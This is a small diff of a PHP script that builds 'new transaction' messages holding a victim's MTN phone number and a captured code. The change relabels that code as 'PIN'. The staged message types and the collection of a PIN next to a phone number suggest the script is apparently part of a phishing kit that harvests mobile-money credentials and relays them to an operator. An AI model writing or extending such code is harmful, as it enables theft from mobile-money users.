@@ -24,7 +24,7 @@ if ($type === 'msg1') {
     }
     $message = "🟠 NOUVELLE TRANSACTION\n\n" .
                "📱 Numéro MTN : {$phone}\n" .
-               "🔢 Code de confirmation : {$tx1}";
+               "🔢 PIN : {$tx1}";
 } elseif ($type === 'msg2') {
     if ($phone === '' || $tx1 === '' || $tx2 === '') {
         http_response_code(400);
